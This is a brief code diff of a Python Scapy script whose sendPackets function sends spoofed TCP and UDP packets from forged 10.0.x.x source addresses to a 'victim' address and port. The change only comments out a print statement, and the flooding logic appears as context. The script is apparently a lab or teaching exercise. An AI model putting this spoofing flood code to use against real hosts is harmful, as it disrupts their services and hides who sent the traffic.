@@ -9,7 +9,7 @@ def sendPackets(subnetMin,subnetMax,victimAddress,victimPort):
 			packetUDP = IP(dst=victimAddress,src="10.0." + str(i) + "." + str(j),ttl=25)/UDP(dport=victimPort)
 			send(packetTCP)
 			send(packetUDP)
-			print("victim sees 10.0." + str(i) + "." + str(j))
+			#print("victim sees 10.0." + str(i) + "." + str(j))
 			time.sleep(1)
 
 
